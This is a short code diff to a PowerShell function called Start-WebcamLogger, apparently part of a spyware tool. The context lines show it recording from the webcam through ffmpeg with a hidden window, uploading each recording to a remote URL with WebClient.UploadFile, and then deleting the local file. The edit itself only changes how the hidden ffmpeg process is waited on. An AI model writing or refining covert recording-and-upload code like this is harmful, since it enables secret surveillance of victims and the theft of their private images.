@@ -71,7 +71,7 @@ function Start-WebcamLogger{
             "$path"
         );
 
-        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList $ffmpegArgs -Wait -WindowStyle hidden;
+        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList $ffmpegArgs -WindowStyle hidden | Wait-Process;
         (New-Object System.Net.WebClient).UploadFile($url,$path) > $null;
         $count++;
         Remove-Item $path -Force;
